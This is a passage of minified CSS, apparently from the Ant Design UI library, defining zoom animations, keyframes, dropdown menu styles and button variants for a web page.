oth;animation-fill-mode:both;-webkit-animation-play-state:paused;animation-play-state:paused}.zoom-big-fast-appear.zoom-big-fast-appear-active,.zoom-big-fast-enter.zoom-big-fast-enter-active{-webkit-animation-name:antZoomBigIn;animation-name:antZoomBigIn;-webkit-animation-play-state:running;animation-play-state:running}.zoom-big-fast-leave.zoom-big-fast-leave-active{-webkit-animation-name:antZoomBigOut;animation-name:antZoomBigOut;-webkit-animation-play-state:running;animation-play-state:running;pointer-events:none}.zoom-big-fast-appear,.zoom-big-fast-enter{-webkit-transform:scale(0);transform:scale(0);-webkit-animation-timing-function:cubic-bezier(.08,.82,.17,1);animation-timing-function:cubic-bezier(.08,.82,.17,1)}.zoom-big-fast-leave{-webkit-animation-timing-function:cubic-bezier(.78,.14,.15,.86);animation-timing-function:cubic-bezier(.78,.14,.15,.86)}.zoom-up-appear,.zoom-up-enter,.zoom-up-leave{-webkit-animation-duration:.2s;animation-duration:.2s;-webkit-animation-fill-mode:both;animation-fill-mode:both;-webkit-animation-play-state:paused;animation-play-state:paused}.zoom-up-appear.zoom-up-appear-active,.zoom-up-enter.zoom-up-enter-active{-webkit-animation-name:antZoomUpIn;animation-name:antZoomUpIn;-webkit-animation-play-state:running;animation-play-state:running}.zoom-up-leave.zoom-up-leave-active{-webkit-animation-name:antZoomUpOut;animation-name:antZoomUpOut;-webkit-animation-play-state:running;animation-play-state:running;pointer-events:none}.zoom-up-appear,.zoom-up-enter{-webkit-transform:scale(0);transform:scale(0);-webkit-animation-timing-function:cubic-bezier(.08,.82,.17,1);animation-timing-function:cubic-bezier(.08,.82,.17,1)}.zoom-up-leave{-webkit-animation-timing-function:cubic-bezier(.78,.14,.15,.86);animation-timing-function:cubic-bezier(.78,.14,.15,.86)}.zoom-down-appear,.zoom-down-enter,.zoom-down-leave{-webkit-animation-duration:.2s;animation-duration:.2s;-webkit-animation-fill-mode:both;animation-fill-mode:both;-webkit-animation-play-state:paused;animation-play-state:paused}.zoom-down-appear.zoom-down-appear-active,.zoom-down-enter.zoom-down-enter-active{-webkit-animation-name:antZoomDownIn;animation-name:antZoomDownIn;-webkit-animation-play-state:running;animation-play-state:running}.zoom-down-leave.zoom-down-leave-active{-webkit-animation-name:antZoomDownOut;animation-name:antZoomDownOut;-webkit-animation-play-state:running;animation-play-state:running;pointer-events:none}.zoom-down-appear,.zoom-down-enter{-webkit-transform:scale(0);transform:scale(0);-webkit-animation-timing-function:cubic-bezier(.08,.82,.17,1);animation-timing-function:cubic-bezier(.08,.82,.17,1)}.zoom-down-leave{-webkit-animation-timing-function:cubic-bezier(.78,.14,.15,.86);animation-timing-function:cubic-bezier(.78,.14,.15,.86)}.zoom-left-appear,.zoom-left-enter,.zoom-left-leave{-webkit-animation-duration:.2s;animation-duration:.2s;-webkit-animation-fill-mode:both;animation-fill-mode:both;-webkit-animation-play-state:paused;animation-play-state:paused}.zoom-left-appear.zoom-left-appear-active,.zoom-left-enter.zoom-left-enter-active{-webkit-animation-name:antZoomLeftIn;animation-name:antZoomLeftIn;-webkit-animation-play-state:running;animation-play-state:running}.zoom-left-leave.zoom-left-leave-active{-webkit-animation-name:antZoomLeftOut;animation-name:antZoomLeftOut;-webkit-animation-play-state:running;animation-play-state:running;pointer-events:none}.zoom-left-appear,.zoom-left-enter{-webkit-transform:scale(0);transform:scale(0);-webkit-animation-timing-function:cubic-bezier(.08,.82,.17,1);animation-timing-function:cubic-bezier(.08,.82,.17,1)}.zoom-left-leave{-webkit-animation-timing-function:cubic-bezier(.78,.14,.15,.86);animation-timing-function:cubic-bezier(.78,.14,.15,.86)}.zoom-right-appear,.zoom-right-enter,.zoom-right-leave{-webkit-animation-duration:.2s;animation-duration:.2s;-webkit-animation-fill-mode:both;animation-fill-mode:both;-webkit-animation-play-state:paused;animation-play-state:paused}.zoom-right-appear.zoom-right-appear-active,.zoom-right-enter.zoom-right-enter-active{-webkit-animation-name:antZoomRightIn;animation-name:antZoomRightIn;-webkit-animation-play-state:running;animation-play-state:running}.zoom-right-leave.zoom-right-leave-active{-webkit-animation-name:antZoomRightOut;animation-name:antZoomRightOut;-webkit-animation-play-state:running;animation-play-state:running;pointer-events:none}.zoom-right-appear,.zoom-right-enter{-webkit-transform:scale(0);transform:scale(0);-webkit-animation-timing-function:cubic-bezier(.08,.82,.17,1);animation-timing-function:cubic-bezier(.08,.82,.17,1)}.zoom-right-leave{-webkit-animation-timing-function:cubic-bezier(.78,.14,.15,.86);animation-timing-function:cubic-bezier(.78,.14,.15,.86)}@-webkit-keyframes antZoomIn{0%{opacity:0;-webkit-transform:scale(.2);transform:scale(.2)}to{opacity:1;-webkit-transform:scale(1);transform:scale(1)}}@keyframes antZoomIn{0%{opacity:0;-webkit-transform:scale(.2);transform:scale(.2)}to{opacity:1;-webkit-transform:scale(1);transform:scale(1)}}@-webkit-keyframes antZoomOut{0%{-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform:scale(.2);transform:scale(.2)}}@keyframes antZoomOut{0%{-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform:scale(.2);transform:scale(.2)}}@-webkit-keyframes antZoomBigIn{0%{opacity:0;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform:scale(1);transform:scale(1)}}@keyframes antZoomBigIn{0%{opacity:0;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform:scale(1);transform:scale(1)}}@-webkit-keyframes antZoomBigOut{0%{-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform:scale(.8);transform:scale(.8)}}@keyframes antZoomBigOut{0%{-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform:scale(.8);transform:scale(.8)}}@-webkit-keyframes antZoomUpIn{0%{opacity:0;-webkit-transform-origin:50% 0;transform-origin:50% 0;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform-origin:50% 0;transform-origin:50% 0;-webkit-transform:scale(1);transform:scale(1)}}@keyframes antZoomUpIn{0%{opacity:0;-webkit-transform-origin:50% 0;transform-origin:50% 0;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform-origin:50% 0;transform-origin:50% 0;-webkit-transform:scale(1);transform:scale(1)}}@-webkit-keyframes antZoomUpOut{0%{-webkit-transform-origin:50% 0;transform-origin:50% 0;-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform-origin:50% 0;transform-origin:50% 0;-webkit-transform:scale(.8);transform:scale(.8)}}@keyframes antZoomUpOut{0%{-webkit-transform-origin:50% 0;transform-origin:50% 0;-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform-origin:50% 0;transform-origin:50% 0;-webkit-transform:scale(.8);transform:scale(.8)}}@-webkit-keyframes antZoomLeftIn{0%{opacity:0;-webkit-transform-origin:0 50%;transform-origin:0 50%;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform-origin:0 50%;transform-origin:0 50%;-webkit-transform:scale(1);transform:scale(1)}}@keyframes antZoomLeftIn{0%{opacity:0;-webkit-transform-origin:0 50%;transform-origin:0 50%;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform-origin:0 50%;transform-origin:0 50%;-webkit-transform:scale(1);transform:scale(1)}}@-webkit-keyframes antZoomLeftOut{0%{-webkit-transform-origin:0 50%;transform-origin:0 50%;-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform-origin:0 50%;transform-origin:0 50%;-webkit-transform:scale(.8);transform:scale(.8)}}@keyframes antZoomLeftOut{0%{-webkit-transform-origin:0 50%;transform-origin:0 50%;-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform-origin:0 50%;transform-origin:0 50%;-webkit-transform:scale(.8);transform:scale(.8)}}@-webkit-keyframes antZoomRightIn{0%{opacity:0;-webkit-transform-origin:100% 50%;transform-origin:100% 50%;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform-origin:100% 50%;transform-origin:100% 50%;-webkit-transform:scale(1);transform:scale(1)}}@keyframes antZoomRightIn{0%{opacity:0;-webkit-transform-origin:100% 50%;transform-origin:100% 50%;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform-origin:100% 50%;transform-origin:100% 50%;-webkit-transform:scale(1);transform:scale(1)}}@-webkit-keyframes antZoomRightOut{0%{-webkit-transform-origin:100% 50%;transform-origin:100% 50%;-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform-origin:100% 50%;transform-origin:100% 50%;-webkit-transform:scale(.8);transform:scale(.8)}}@keyframes antZoomRightOut{0%{-webkit-transform-origin:100% 50%;transform-origin:100% 50%;-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform-origin:100% 50%;transform-origin:100% 50%;-webkit-transform:scale(.8);transform:scale(.8)}}@-webkit-keyframes antZoomDownIn{0%{opacity:0;-webkit-transform-origin:50% 100%;transform-origin:50% 100%;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform-origin:50% 100%;transform-origin:50% 100%;-webkit-transform:scale(1);transform:scale(1)}}@keyframes antZoomDownIn{0%{opacity:0;-webkit-transform-origin:50% 100%;transform-origin:50% 100%;-webkit-transform:scale(.8);transform:scale(.8)}to{-webkit-transform-origin:50% 100%;transform-origin:50% 100%;-webkit-transform:scale(1);transform:scale(1)}}@-webkit-keyframes antZoomDownOut{0%{-webkit-transform-origin:50% 100%;transform-origin:50% 100%;-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform-origin:50% 100%;transform-origin:50% 100%;-webkit-transform:scale(.8);transform:scale(.8)}}@keyframes antZoomDownOut{0%{-webkit-transform-origin:50% 100%;transform-origin:50% 100%;-webkit-transform:scale(1);transform:scale(1)}to{opacity:0;-webkit-transform-origin:50% 100%;transform-origin:50% 100%;-webkit-transform:scale(.8);transform:scale(.8)}}.ant-motion-collapse{overflow:hidden}.ant-motion-collapse-active{-webkit-transition:height .15s cubic-bezier(.645,.045,.355,1),opacity .15s cubic-bezier(.645,.045,.355,1)!important;transition:height .15s cubic-bezier(.645,.045,.355,1),opacity .15s cubic-bezier(.645,.045,.355,1)!important}</style><style type="text/css">.ant-dropdown{font-family:Chinese Quote,-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif;font-size:14px;-webkit-font-feature-settings:"tnum";font-feature-settings:"tnum";font-variant:tabular-nums;line-height:1.5;color:rgba(0,0,0,.65);-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;padding:0;list-style:none;position:absolute;left:-9999px;top:-9999px;z-index:1050;display:block}.ant-dropdown-wrap{position:relative}.ant-dropdown-wrap .ant-btn>.anticon-down{display:inline-block;font-size:12px;font-size:10px\9;-webkit-transform:scale(.83333333) rotate(0deg);transform:scale(.83333333) rotate(0deg)}:root .ant-dropdown-wrap .ant-btn>.anticon-down{font-size:12px}.ant-dropdown-wrap .anticon-down:before{-webkit-transition:-webkit-transform .2s;transition:-webkit-transform .2s;transition:transform .2s;transition:transform .2s,-webkit-transform .2s}.ant-dropdown-wrap-open .anticon-down:before{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.ant-dropdown-hidden,.ant-dropdown-menu-hidden{display:none}.ant-dropdown-menu{outline:none;position:relative;list-style-type:none;padding:4px 0;margin:0;text-align:left;background-color:#fff;border-radius:4px;-webkit-box-shadow:0 2px 8px rgba(0,0,0,.15);box-shadow:0 2px 8px rgba(0,0,0,.15);background-clip:padding-box}.ant-dropdown-menu-item-group-title{color:rgba(0,0,0,.45);padding:5px 12px;-webkit-transition:all .3s;transition:all .3s}.ant-dropdown-menu-submenu-popup{position:absolute;z-index:1050}.ant-dropdown-menu-item,.ant-dropdown-menu-submenu-title{padding:5px 12px;margin:0;clear:both;font-size:14px;font-weight:400;color:rgba(0,0,0,.65);white-space:nowrap;cursor:pointer;-webkit-transition:all .3s;transition:all .3s;line-height:22px}.ant-dropdown-menu-item>.anticon:first-child,.ant-dropdown-menu-submenu-title>.anticon:first-child{min-width:12px;margin-right:8px}.ant-dropdown-menu-item>a,.ant-dropdown-menu-submenu-title>a{color:rgba(0,0,0,.65);display:block;padding:5px 12px;margin:-5px -12px;-webkit-transition:all .3s;transition:all .3s}.ant-dropdown-menu-item>a:focus,.ant-dropdown-menu-submenu-title>a:focus{text-decoration:none}.ant-dropdown-menu-item-selected,.ant-dropdown-menu-item-selected>a,.ant-dropdown-menu-submenu-title-selected,.ant-dropdown-menu-submenu-title-selected>a{color:#1890ff;background-color:#e6f7ff}.ant-dropdown-menu-item:hover,.ant-dropdown-menu-submenu-title:hover{background-color:#e6f7ff}.ant-dropdown-menu-item-disabled,.ant-dropdown-menu-submenu-title-disabled{color:rgba(0,0,0,.25);cursor:not-allowed}.ant-dropdown-menu-item-disabled:hover,.ant-dropdown-menu-submenu-title-disabled:hover{color:rgba(0,0,0,.25);background-color:#fff;cursor:not-allowed}.ant-dropdown-menu-item-divider,.ant-dropdown-menu-submenu-title-divider{height:1px;overflow:hidden;background-color:#e8e8e8;line-height:0;margin:4px 0}.ant-dropdown-menu-item .ant-dropdown-menu-submenu-arrow,.ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-arrow{position:absolute;right:8px}.ant-dropdown-menu-item .ant-dropdown-menu-submenu-arrow:after,.ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-arrow:after{font-family:anticon!important;font-style:normal;content:"\E61F";color:rgba(0,0,0,.45);display:inline-block;font-size:12px;font-size:10px\9;-webkit-transform:scale(.83333333) rotate(0deg);transform:scale(.83333333) rotate(0deg)}:root .ant-dropdown-menu-item .ant-dropdown-menu-submenu-arrow:after,:root .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-arrow:after{font-size:12px}.ant-dropdown-menu-submenu-title{padding-right:26px}.ant-dropdown-menu-submenu-vertical{position:relative}.ant-dropdown-menu-submenu-vertical>.ant-dropdown-menu{top:0;left:100%;position:absolute;min-width:100%;margin-left:4px;-webkit-transform-origin:0 0;transform-origin:0 0}.ant-dropdown-menu-submenu.ant-dropdown-menu-submenu-disabled .ant-dropdown-menu-submenu-title,.ant-dropdown-menu-submenu.ant-dropdown-menu-submenu-disabled .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-arrow:after{color:rgba(0,0,0,.25)}.ant-dropdown.slide-down-appear.slide-down-appear-active.ant-dropdown-placement-bottomCenter,.ant-dropdown.slide-down-appear.slide-down-appear-active.ant-dropdown-placement-bottomLeft,.ant-dropdown.slide-down-appear.slide-down-appear-active.ant-dropdown-placement-bottomRight,.ant-dropdown.slide-down-enter.slide-down-enter-active.ant-dropdown-placement-bottomCenter,.ant-dropdown.slide-down-enter.slide-down-enter-active.ant-dropdown-placement-bottomLeft,.ant-dropdown.slide-down-enter.slide-down-enter-active.ant-dropdown-placement-bottomRight{-webkit-animation-name:antSlideUpIn;animation-name:antSlideUpIn}.ant-dropdown.slide-up-appear.slide-up-appear-active.ant-dropdown-placement-topCenter,.ant-dropdown.slide-up-appear.slide-up-appear-active.ant-dropdown-placement-topLeft,.ant-dropdown.slide-up-appear.slide-up-appear-active.ant-dropdown-placement-topRight,.ant-dropdown.slide-up-enter.slide-up-enter-active.ant-dropdown-placement-topCenter,.ant-dropdown.slide-up-enter.slide-up-enter-active.ant-dropdown-placement-topLeft,.ant-dropdown.slide-up-enter.slide-up-enter-active.ant-dropdown-placement-topRight{-webkit-animation-name:antSlideDownIn;animation-name:antSlideDownIn}.ant-dropdown.slide-down-leave.slide-down-leave-active.ant-dropdown-placement-bottomCenter,.ant-dropdown.slide-down-leave.slide-down-leave-active.ant-dropdown-placement-bottomLeft,.ant-dropdown.slide-down-leave.slide-down-leave-active.ant-dropdown-placement-bottomRight{-webkit-animation-name:antSlideUpOut;animation-name:antSlideUpOut}.ant-dropdown.slide-up-leave.slide-up-leave-active.ant-dropdown-placement-topCenter,.ant-dropdown.slide-up-leave.slide-up-leave-active.ant-dropdown-placement-topLeft,.ant-dropdown.slide-up-leave.slide-up-leave-active.ant-dropdown-placement-topRight{-webkit-animation-name:antSlideDownOut;animation-name:antSlideDownOut}.ant-dropdown-link .anticon-down,.ant-dropdown-trigger .anticon-down{display:inline-block;font-size:12px;font-size:10px\9;-webkit-transform:scale(.83333333) rotate(0deg);transform:scale(.83333333) rotate(0deg)}:root .ant-dropdown-link .anticon-down,:root .ant-dropdown-trigger .anticon-down{font-size:12px}.ant-dropdown-link .anticon-ellipsis,.ant-dropdown-trigger .anticon-ellipsis{text-shadow:0 0 currentColor}.ant-dropdown-button{white-space:nowrap}.ant-dropdown-button.ant-btn-group>.ant-btn:last-child:not(:first-child){padding-left:8px;padding-right:8px}.ant-dropdown-button .anticon-down{display:inline-block;font-size:12px;font-size:10px\9;-webkit-transform:scale(.83333333) rotate(0deg);transform:scale(.83333333) rotate(0deg)}:root .ant-dropdown-button .anticon-down{font-size:12px}.ant-dropdown-menu-dark,.ant-dropdown-menu-dark .ant-dropdown-menu{background:#001529}.ant-dropdown-menu-dark .ant-dropdown-menu-item,.ant-dropdown-menu-dark .ant-dropdown-menu-item .ant-dropdown-menu-submenu-arrow:after,.ant-dropdown-menu-dark .ant-dropdown-menu-item>a,.ant-dropdown-menu-dark .ant-dropdown-menu-item>a .ant-dropdown-menu-submenu-arrow:after,.ant-dropdown-menu-dark .ant-dropdown-menu-submenu-title,.ant-dropdown-menu-dark .ant-dropdown-menu-submenu-title .ant-dropdown-menu-submenu-arrow:after{color:hsla(0,0%,100%,.65)}.ant-dropdown-menu-dark .ant-dropdown-menu-item:hover,.ant-dropdown-menu-dark .ant-dropdown-menu-item>a:hover,.ant-dropdown-menu-dark .ant-dropdown-menu-submenu-title:hover{color:#fff;background:transparent}.ant-dropdown-menu-dark .ant-dropdown-menu-item-selected,.ant-dropdown-menu-dark .ant-dropdown-menu-item-selected:hover,.ant-dropdown-menu-dark .ant-dropdown-menu-item-selected>a{background:#1890ff;color:#fff}</style><style type="text/css">.ant-btn{line-height:1.5;display:inline-block;font-weight:400;text-align:center;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:0 15px;font-size:14px;border-radius:4px;height:32px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-transition:all .3s cubic-bezier(.645,.045,.355,1);transition:all .3s cubic-bezier(.645,.045,.355,1);position:relative;color:rgba(0,0,0,.65);background-color:#fff;border-color:#d9d9d9}.ant-btn>.anticon{line-height:1}.ant-btn,.ant-btn:active,.ant-btn:focus{outline:0}.ant-btn:not([disabled]):hover{text-decoration:none}.ant-btn:not([disabled]):active{outline:0;-webkit-transition:none;transition:none}.ant-btn.disabled,.ant-btn[disabled]{cursor:not-allowed}.ant-btn.disabled>*,.ant-btn[disabled]>*{pointer-events:none}.ant-btn-lg{padding:0 15px;font-size:16px;border-radius:4px;height:40px}.ant-btn-sm{padding:0 7px;font-size:14px;border-radius:4px;height:24px}.ant-btn>a:only-child{color:currentColor}.ant-btn>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn:focus,.ant-btn:hover{color:#40a9ff;background-color:#fff;border-color:#40a9ff}.ant-btn:focus>a:only-child,.ant-btn:hover>a:only-child{color:currentColor}.ant-btn:focus>a:only-child:after,.ant-btn:hover>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn.active,.ant-btn:active{color:#096dd9;background-color:#fff;border-color:#096dd9}.ant-btn.active>a:only-child,.ant-btn:active>a:only-child{color:currentColor}.ant-btn.active>a:only-child:after,.ant-btn:active>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn.disabled,.ant-btn.disabled.active,.ant-btn.disabled:active,.ant-btn.disabled:focus,.ant-btn.disabled:hover,.ant-btn[disabled],.ant-btn[disabled].active,.ant-btn[disabled]:active,.ant-btn[disabled]:focus,.ant-btn[disabled]:hover{color:rgba(0,0,0,.25);background-color:#f5f5f5;border-color:#d9d9d9}.ant-btn.disabled.active>a:only-child,.ant-btn.disabled:active>a:only-child,.ant-btn.disabled:focus>a:only-child,.ant-btn.disabled:hover>a:only-child,.ant-btn.disabled>a:only-child,.ant-btn[disabled].active>a:only-child,.ant-btn[disabled]:active>a:only-child,.ant-btn[disabled]:focus>a:only-child,.ant-btn[disabled]:hover>a:only-child,.ant-btn[disabled]>a:only-child{color:currentColor}.ant-btn.disabled.active>a:only-child:after,.ant-btn.disabled:active>a:only-child:after,.ant-btn.disabled:focus>a:only-child:after,.ant-btn.disabled:hover>a:only-child:after,.ant-btn.disabled>a:only-child:after,.ant-btn[disabled].active>a:only-child:after,.ant-btn[disabled]:active>a:only-child:after,.ant-btn[disabled]:focus>a:only-child:after,.ant-btn[disabled]:hover>a:only-child:after,.ant-btn[disabled]>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn.active,.ant-btn:active,.ant-btn:focus,.ant-btn:hover{background:#fff;text-decoration:none}.ant-btn>i,.ant-btn>span{pointer-events:none}.ant-btn-primary{color:#fff;background-color:#1890ff;border-color:#1890ff}.ant-btn-primary>a:only-child{color:currentColor}.ant-btn-primary>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-primary:focus,.ant-btn-primary:hover{color:#fff;background-color:#40a9ff;border-color:#40a9ff}.ant-btn-primary:focus>a:only-child,.ant-btn-primary:hover>a:only-child{color:currentColor}.ant-btn-primary:focus>a:only-child:after,.ant-btn-primary:hover>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-primary.active,.ant-btn-primary:active{color:#fff;background-color:#096dd9;border-color:#096dd9}.ant-btn-primary.active>a:only-child,.ant-btn-primary:active>a:only-child{color:currentColor}.ant-btn-primary.active>a:only-child:after,.ant-btn-primary:active>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-primary.disabled,.ant-btn-primary.disabled.active,.ant-btn-primary.disabled:active,.ant-btn-primary.disabled:focus,.ant-btn-primary.disabled:hover,.ant-btn-primary[disabled],.ant-btn-primary[disabled].active,.ant-btn-primary[disabled]:active,.ant-btn-primary[disabled]:focus,.ant-btn-primary[disabled]:hover{color:rgba(0,0,0,.25);background-color:#f5f5f5;border-color:#d9d9d9}.ant-btn-primary.disabled.active>a:only-child,.ant-btn-primary.disabled:active>a:only-child,.ant-btn-primary.disabled:focus>a:only-child,.ant-btn-primary.disabled:hover>a:only-child,.ant-btn-primary.disabled>a:only-child,.ant-btn-primary[disabled].active>a:only-child,.ant-btn-primary[disabled]:active>a:only-child,.ant-btn-primary[disabled]:focus>a:only-child,.ant-btn-primary[disabled]:hover>a:only-child,.ant-btn-primary[disabled]>a:only-child{color:currentColor}.ant-btn-primary.disabled.active>a:only-child:after,.ant-btn-primary.disabled:active>a:only-child:after,.ant-btn-primary.disabled:focus>a:only-child:after,.ant-btn-primary.disabled:hover>a:only-child:after,.ant-btn-primary.disabled>a:only-child:after,.ant-btn-primary[disabled].active>a:only-child:after,.ant-btn-primary[disabled]:active>a:only-child:after,.ant-btn-primary[disabled]:focus>a:only-child:after,.ant-btn-primary[disabled]:hover>a:only-child:after,.ant-btn-primary[disabled]>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-group .ant-btn-primary:not(:first-child):not(:last-child){border-right-color:#40a9ff;border-left-color:#40a9ff}.ant-btn-group .ant-btn-primary:not(:first-child):not(:last-child):disabled{border-color:#d9d9d9}.ant-btn-group .ant-btn-primary:first-child:not(:last-child){border-right-color:#40a9ff}.ant-btn-group .ant-btn-primary:first-child:not(:last-child)[disabled]{border-right-color:#d9d9d9}.ant-btn-group .ant-btn-primary+.ant-btn-primary,.ant-btn-group .ant-btn-primary:last-child:not(:first-child){border-left-color:#40a9ff}.ant-btn-group .ant-btn-primary+.ant-btn-primary[disabled],.ant-btn-group .ant-btn-primary:last-child:not(:first-child)[disabled]{border-left-color:#d9d9d9}.ant-btn-ghost{color:rgba(0,0,0,.65);background-color:transparent;border-color:#d9d9d9}.ant-btn-ghost>a:only-child{color:currentColor}.ant-btn-ghost>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-ghost:focus,.ant-btn-ghost:hover{color:#40a9ff;background-color:transparent;border-color:#40a9ff}.ant-btn-ghost:focus>a:only-child,.ant-btn-ghost:hover>a:only-child{color:currentColor}.ant-btn-ghost:focus>a:only-child:after,.ant-btn-ghost:hover>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-ghost.active,.ant-btn-ghost:active{color:#096dd9;background-color:transparent;border-color:#096dd9}.ant-btn-ghost.active>a:only-child,.ant-btn-ghost:active>a:only-child{color:currentColor}.ant-btn-ghost.active>a:only-child:after,.ant-btn-ghost:active>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-ghost.disabled,.ant-btn-ghost.disabled.active,.ant-btn-ghost.disabled:active,.ant-btn-ghost.disabled:focus,.ant-btn-ghost.disabled:hover,.ant-btn-ghost[disabled],.ant-btn-ghost[disabled].active,.ant-btn-ghost[disabled]:active,.ant-btn-ghost[disabled]:focus,.ant-btn-ghost[disabled]:hover{color:rgba(0,0,0,.25);background-color:#f5f5f5;border-color:#d9d9d9}.ant-btn-ghost.disabled.active>a:only-child,.ant-btn-ghost.disabled:active>a:only-child,.ant-btn-ghost.disabled:focus>a:only-child,.ant-btn-ghost.disabled:hover>a:only-child,.ant-btn-ghost.disabled>a:only-child,.ant-btn-ghost[disabled].active>a:only-child,.ant-btn-ghost[disabled]:active>a:only-child,.ant-btn-ghost[disabled]:focus>a:only-child,.ant-btn-ghost[disabled]:hover>a:only-child,.ant-btn-ghost[disabled]>a:only-child{color:currentColor}.ant-btn-ghost.disabled.active>a:only-child:after,.ant-btn-ghost.disabled:active>a:only-child:after,.ant-btn-ghost.disabled:focus>a:only-child:after,.ant-btn-ghost.disabled:hover>a:only-child:after,.ant-btn-ghost.disabled>a:only-child:after,.ant-btn-ghost[disabled].active>a:only-child:after,.ant-btn-ghost[disabled]:active>a:only-child:after,.ant-btn-ghost[disabled]:focus>a:only-child:after,.ant-btn-ghost[disabled]:hover>a:only-child:after,.ant-btn-ghost[disabled]>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-dashed{color:rgba(0,0,0,.65);background-color:#fff;border-color:#d9d9d9;border-style:dashed}.ant-btn-dashed>a:only-child{color:currentColor}.ant-btn-dashed>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-dashed:focus,.ant-btn-dashed:hover{color:#40a9ff;background-color:#fff;border-color:#40a9ff}.ant-btn-dashed:focus>a:only-child,.ant-btn-dashed:hover>a:only-child{color:currentColor}.ant-btn-dashed:focus>a:only-child:after,.ant-btn-dashed:hover>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-dashed.active,.ant-btn-dashed:active{color:#096dd9;background-color:#fff;border-color:#096dd9}.ant-btn-dashed.active>a:only-child,.ant-btn-dashed:active>a:only-child{color:currentColor}.ant-btn-dashed.active>a:only-child:after,.ant-btn-dashed:active>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-dashed.disabled,.ant-btn-dashed.disabled.active,.ant-btn-dashed.disabled:active,.ant-btn-dashed.disabled:focus,.ant-btn-dashed.disabled:hover,.ant-btn-dashed[disabled],.ant-btn-dashed[disabled].active,.ant-btn-dashed[disabled]:active,.ant-btn-dashed[disabled]:focus,.ant-btn-dashed[disabled]:hover{color:rgba(0,0,0,.25);background-color:#f5f5f5;border-color:#d9d9d9}.ant-btn-dashed.disabled.active>a:only-child,.ant-btn-dashed.disabled:active>a:only-child,.ant-btn-dashed.disabled:focus>a:only-child,.ant-btn-dashed.disabled:hover>a:only-child,.ant-btn-dashed.disabled>a:only-child,.ant-btn-dashed[disabled].active>a:only-child,.ant-btn-dashed[disabled]:active>a:only-child,.ant-btn-dashed[disabled]:focus>a:only-child,.ant-btn-dashed[disabled]:hover>a:only-child,.ant-btn-dashed[disabled]>a:only-child{color:currentColor}.ant-btn-dashed.disabled.active>a:only-child:after,.ant-btn-dashed.disabled:active>a:only-child:after,.ant-btn-dashed.disabled:focus>a:only-child:after,.ant-btn-dashed.disabled:hover>a:only-child:after,.ant-btn-dashed.disabled>a:only-child:after,.ant-btn-dashed[disabled].active>a:only-child:after,.ant-btn-dashed[disabled]:active>a:only-child:after,.ant-btn-dashed[disabled]:focus>a:only-child:after,.ant-btn-dashed[disabled]:hover>a:only-child:after,.ant-btn-dashed[disabled]>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-danger{color:#f5222d;background-color:#f5f5f5;border-color:#d9d9d9}.ant-btn-danger>a:only-child{color:currentColor}.ant-btn-danger>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-danger:hover{color:#fff;background-color:#ff4d4f;border-color:#ff4d4f}.ant-btn-danger:hover>a:only-child{color:currentColor}.ant-btn-danger:hover>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-btn-danger:focus{color:#ff4d4f;background-color:#fff;border-color:#ff4d4f}.ant-btn-danger:focus>a:only-child{color:currentColor}.ant-btn-danger:focus>a:only-child:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:transparent}.ant-b